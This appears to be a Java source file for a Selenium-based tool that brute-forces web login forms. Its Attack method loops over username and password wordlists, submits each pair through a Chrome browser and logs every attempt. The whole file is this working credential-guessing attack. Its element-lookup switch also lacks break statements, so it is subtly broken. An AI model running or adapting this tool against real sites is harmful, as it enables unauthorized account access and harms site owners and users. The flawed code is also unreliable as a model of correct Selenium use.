/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Controller;

import java.awt.Robot;
import java.awt.event.InputEvent;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;

import org.openqa.selenium.Alert;
import org.openqa.selenium.By;
import org.openqa.selenium.Keys;
import org.openqa.selenium.NoAlertPresentException;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;

import View.Console;
import static org.openqa.selenium.By.id;
/**
 *
 * @author Usuario
 */
public class Driver {
    static WebDriver driver;
    //static Console consol = new Console();
    
    public static WebDriver Start(){
        try{
            System.setProperty("webdriver.chrome.driver", System.getProperty("user.dir")+"\\"+"Drivers\\chromedriver\\chromedriver.exe");
            driver = new ChromeDriver();
            driver.manage().window().maximize();
        }catch(Exception e){}
        
        return driver; 
    
    }
    
    public static void Stop(){
        driver.close();  
        driver.quit();
    }
    
    public static void login(WebDriver driver,String url){
        driver.navigate().to(url);
    }
    
    public static WebElement Find(WebDriver driver, String idtype, String id){
        WebElement Elemento = null;
        try{
            switch(idtype){
                case "ID":
                    Elemento = driver.findElement(By.id(id));
                case "Class Name":
                    Elemento = driver.findElement(By.className(id));
                case "Name":
                    Elemento = driver.findElement(By.name(id));
                case "XPath":
                    Elemento = driver.findElement(By.xpath(id));
            }
        }catch(Exception e){ }
        return  Elemento;         
    }
    
    public static void Attack(WebDriver driver, String tpuser, String txtuser, String tppassword, String txtpassword, String tpboton, String txtboton, String users, String pwds, Boolean check, Integer targetUsers, Integer targetPwds)throws InterruptedException, FileNotFoundException, IOException{
        WebElement user = null, password = null, boton = null;
        
        if(!check){
            //if targetUsers is equal to 0, users = single else users= list
            //if targetPwds is equal to 0, pwds = single else pwds= list
            if(targetUsers == 0 & targetPwds == 0){
                
                user = Find(driver, tpuser, txtuser);
                password = Find(driver, tppassword, txtpassword);
                boton = Find(driver, tpboton, txtboton);
                user.sendKeys(users);
                password.sendKeys(pwds);
                boton.click();
                //consol.Write("[+] trying user: "+users+" and password: "+pwds);
                System.out.println("[+] trying user: "+users+" and password: "+pwds);
            }else if(targetUsers == 1 & targetPwds == 0){
                FileReader f = new FileReader(users);
                BufferedReader b = new BufferedReader(f);
                String cadena;
                while ((cadena = b.readLine())!=null) {
                    user = Find(driver, tpuser, txtuser);
                    password = Find(driver, tppassword, txtpassword);
                    boton = Find(driver, tpboton, txtboton);                    
                    user.sendKeys(cadena);
                    password.sendKeys(pwds);
                    boton.click();
                    //consol.Write("[+] trying user: "+cadena+" and password: "+pwds);
                    System.out.println("[+] trying user: "+cadena+" and password: "+pwds);
                }
                b.close();
            }else if(targetUsers == 0 & targetPwds == 1){
                FileReader f = new FileReader(pwds);
                BufferedReader b = new BufferedReader(f);
                String cadena;
                while ((cadena = b.readLine())!=null) {  
                    user = Find(driver, tpuser, txtuser);
                    password = Find(driver, tppassword, txtpassword);
                    boton = Find(driver, tpboton, txtboton);
                    user.sendKeys(users);
                    password.sendKeys(cadena);
                    boton.click();
                    //consol.Write("[+] trying user: "+users+" and password: "+cadena);
                    System.out.println("[+] trying user: "+users+" and password: "+cadena);
                }
                b.close();
            }else if(targetUsers == 1 & targetPwds == 1){
                FileReader f = new FileReader(users);
                BufferedReader b = new BufferedReader(f);
                String cadena;
                while ((cadena = b.readLine())!=null) {   
                    FileReader r = new FileReader(pwds);
                    BufferedReader g = new BufferedReader(r);
                    String cadena2;
                    while ((cadena2 = g.readLine())!=null) {   
                        user = Find(driver, tpuser, txtuser);
                        password = Find(driver, tppassword, txtpassword);
                        boton = Find(driver, tpboton, txtboton);
                        user.sendKeys(cadena);
                        password.sendKeys(cadena2);
                        boton.click();
                        //consol.Write("[+] trying user: "+cadena+" and password: "+cadena2);
                        System.out.println("[+] trying user: "+cadena+" and password: "+cadena2);
                    }
                    g.close();
                }
                b.close();
            }
        }else{
            //if targetUsers is equal to 0, users = single else users= list
            //if targetPwds is equal to 0, pwds = single else pwds= list
            if(targetUsers == 0 & targetPwds == 0){
                System.out.println("2:0");
                user = Find(driver, tpuser, txtuser);
                password = Find(driver, tppassword, txtpassword);
                boton = Find(driver, tpboton, txtboton);
                user.sendKeys(users);
                password.sendKeys(pwds);
                boton.click();
                //consol.Write("[+] trying user: "+users+" and password: "+pwds);
                System.out.println("[+] trying user: "+users+" and password: "+pwds);
                Alert alerta = capturarAlert(10);
	        try {
                   alerta.accept(); 
                } catch (Exception e) {
                    alerta.dismiss();
                }
            }else if(targetUsers == 1 & targetPwds == 0){
                System.out.println("2:1");
                FileReader f = new FileReader(users);
                BufferedReader b = new BufferedReader(f);
                String cadena;
                while ((cadena = b.readLine())!=null) { 
                    user = Find(driver, tpuser, txtuser);
                    password = Find(driver, tppassword, txtpassword);
                    boton = Find(driver, tpboton, txtboton);
                    user.sendKeys(cadena);
                    password.sendKeys(pwds);
                    boton.click();
                    //consol.Write("[+] trying user: "+cadena+" and password: "+pwds);
                    System.out.println("[+] trying user: "+cadena+" and password: "+pwds);
                    Alert alerta = capturarAlert(10);
                    try {
                       alerta.accept(); 
                    } catch (Exception e) {
                        alerta.dismiss();
                    }
                }
                b.close();
            }else if(targetUsers == 0 & targetPwds == 1){
                System.out.println("2:3");
                FileReader f = new FileReader(pwds);
                BufferedReader b = new BufferedReader(f);
                String cadena;
                while ((cadena = b.readLine())!=null) {  
                    user = Find(driver, tpuser, txtuser);
                    password = Find(driver, tppassword, txtpassword);
                    boton = Find(driver, tpboton, txtboton);
                    user.sendKeys(users);
                    password.sendKeys(cadena);
                    boton.click();
                    //consol.Write("[+] trying user: "+users+" and password: "+cadena);
                    System.out.println("[+] trying user: "+users+" and password: "+cadena);
                    Alert alerta = capturarAlert(10);
                    try {
                       alerta.accept(); 
                    } catch (Exception e) {
                        alerta.dismiss();
                    }
                }
                b.close();
            }else if(targetUsers == 1 & targetPwds == 1){
                System.out.println("2:4");
                FileReader f = new FileReader(users);
                BufferedReader b = new BufferedReader(f);
                String cadena;
                while ((cadena = b.readLine())!=null) {   
                    FileReader r = new FileReader(pwds);
                    BufferedReader g = new BufferedReader(r);
                    String cadena2;
                    while ((cadena2 = g.readLine())!=null) {  
                        user = Find(driver, tpuser, txtuser);
                        password = Find(driver, tppassword, txtpassword);
                        boton = Find(driver, tpboton, txtboton);
                        user.sendKeys(cadena);
                        password.sendKeys(cadena2);
                        boton.click();
                        //consol.Write("[+] trying user: "+cadena+" and password: "+cadena2);
                        System.out.println("[+] trying user: "+cadena+" and password: "+cadena2);
                        Alert alerta = capturarAlert(10);
                        try {
                           alerta.accept(); 
                        } catch (Exception e) {
                            alerta.dismiss();
                        }
                    }
                    g.close();
                }
                b.close();
            }
        }
    }
        
    
    public static Alert capturarAlert(int Tiempo){
        int i=0;
	Alert alert = null;
	boolean isPresente = false;
	while(i++<Tiempo)
	{
            try{
		alert = driver.switchTo().alert();
		isPresente = true;
		break;
	    }catch(NoAlertPresentException e){
		try {
		    Thread.sleep(1000);
		} catch (InterruptedException e1) {
		    e1.printStackTrace();
		}
		continue;
	    }
	}
        return alert;
    }
}
